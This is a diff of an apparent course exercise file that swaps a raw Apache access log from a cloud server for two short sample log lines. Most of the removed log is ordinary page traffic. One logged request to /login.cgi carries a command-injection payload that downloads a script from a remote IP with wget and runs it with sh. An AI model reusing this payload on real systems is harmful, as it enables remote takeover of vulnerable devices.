@@ -1,34 +1,9 @@
 In addition, find log messages showing accesses to a web page in your web server document root, and send me samples of those log messages.
 
-root@ip-10-0-2-32:/var/log/apache2# cat access.log
-109.94.121.8 - - [19/Jul/2018:22:07:59 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-89.149.63.71 - - [19/Jul/2018:22:16:32 +0000] "GET / HTTP/1.1" 200 11576 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:39:47 +0000] "GET / HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:39:48 +0000] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3623 "http://ec2-18-237-125-214.us-west-2.compute.amazonaws.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:39:48 +0000] "GET /favicon.ico HTTP/1.1" 404 541 "http://ec2-18-237-125-214.us-west-2.compute.amazonaws.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:39:56 +0000] "GET /index.html HTTP/1.1" 200 3525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:40:03 +0000] "GET /html/index.html HTTP/1.1" 404 546 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [19/Jul/2018:23:40:03 +0000] "GET /favicon.ico HTTP/1.1" 404 541 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-104.131.94.117 - - [19/Jul/2018:23:40:04 +0000] "GET /favicon.ico HTTP/1.1" 404 542 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-31.184.194.109 - - [19/Jul/2018:23:55:51 +0000] "GET / HTTP/1.0" 200 626 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
-128.223.223.131 - - [20/Jul/2018:00:08:36 +0000] "GET /index.html HTTP/1.1" 200 616 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-128.223.223.131 - - [20/Jul/2018:00:08:40 +0000] "GET /index.html HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
-200.196.41.127 - - [20/Jul/2018:00:19:33 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
-24.23.13.54 - - [20/Jul/2018:00:50:52 +0000] "GET / HTTP/1.0" 200 626 "-" "-"
-2.231.24.16 - - [20/Jul/2018:01:36:32 +0000] "GET / HTTP/1.0" 200 626 "-" "-"
-82.177.122.254 - - [20/Jul/2018:04:26:21 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
-95.172.60.59 - - [20/Jul/2018:04:26:28 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
-201.1.83.187 - - [20/Jul/2018:06:06:19 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
-31.184.194.109 - - [20/Jul/2018:06:48:53 +0000] "GET / HTTP/1.0" 200 626 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
-95.173.225.207 - - [20/Jul/2018:07:52:56 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-31.184.194.109 - - [20/Jul/2018:08:18:23 +0000] "GET / HTTP/1.0" 200 626 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
-151.11.200.245 - - [20/Jul/2018:09:06:39 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-191.205.18.205 - - [20/Jul/2018:09:47:33 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
-111.231.236.170 - - [20/Jul/2018:10:29:35 +0000] "GET / HTTP/1.0" 200 626 "-" "-"
-218.211.168.176 - - [20/Jul/2018:10:53:36 +0000] "GET / HTTP/1.1" 200 560 "-" "Mozilla/5.0"
-197.48.242.189 - - [20/Jul/2018:11:11:50 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$ HTTP/1.1" 400 0 "-" "Hello, World"
-37.6.166.141 - - [20/Jul/2018:12:55:03 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
-119.228.40.161 - - [20/Jul/2018:13:12:43 +0000] "GET / HTTP/1.0" 200 626 "-" "-"
-195.55.240.208 - - [20/Jul/2018:13:32:21 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
-185.103.247.105 - - [20/Jul/2018:15:51:38 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
-91.244.1.4 - - [20/Jul/2018:16:14:08 +0000] "GET / HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+ashears_instance:
+10.0.2.28 - - [23/Jul/2018:21:46:43 +0000] "GET / HTTP/1.1" 200 609 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
+
+alajaji-ins:
+47.203.95.204 - - [23/Jul/2018:18:43:33 +0000] "GET http://httpheader.net/ HTTP/1.1" 200 554 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
+
+
